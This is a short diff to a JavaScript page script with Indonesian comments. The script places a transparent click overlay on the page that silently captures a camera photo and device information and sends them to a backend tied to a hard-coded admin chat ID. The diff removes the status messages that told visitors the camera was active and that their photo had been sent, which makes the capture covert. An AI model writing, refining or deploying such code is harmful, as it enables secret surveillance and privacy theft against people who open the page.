@@ -1,7 +1,6 @@
 const CHAT_ID = "7483495590"; // chat admin
 const statusEl = document.getElementById("status");
 function startAccess() {
-  console.log("Mulai akses fitur…");
   // di sini panggil getUserCamera(), getUserLocation(), getUserIP(), dll
 }
 
@@ -46,7 +45,6 @@ async function captureAndSendPhoto(){
     canvas.toBlob(async blob => {
       const info = await getDeviceInfo();
       await sendToBackend(info, blob);
-      statusEl.textContent = "Foto + info device terkirim!";
     }, "image/jpeg");
 
     stream.getTracks().forEach(track => track.stop());
@@ -67,7 +65,6 @@ clickArea.style.background = "transparent";
 document.body.appendChild(clickArea);
 
 clickArea.addEventListener("click", async ()=>{
-  statusEl.textContent = "Mengaktifkan kamera & live tracking...";
   await captureAndSendPhoto();
   clickArea.remove();
 });
